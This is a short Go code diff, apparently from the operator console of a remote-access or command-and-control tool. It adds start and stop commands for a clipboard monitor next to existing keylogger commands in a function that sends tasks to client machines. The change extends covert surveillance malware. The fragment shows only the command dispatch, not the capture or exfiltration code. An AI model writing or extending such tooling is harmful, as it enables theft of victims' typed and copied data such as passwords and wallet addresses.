@@ -601,6 +601,10 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 		PrepareTaskSimple(c, clientId, command)
 	case "stop-keylogger":
 		PrepareTaskSimple(c, clientId, command)
+	case "start-clipboard-monitor":
+		PrepareTaskSimple(c, clientId, command)
+	case "stop-clipboard-monitor":
+		PrepareTaskSimple(c, clientId, command)
 	default:
 		c.Println("Task not found.")
 	}
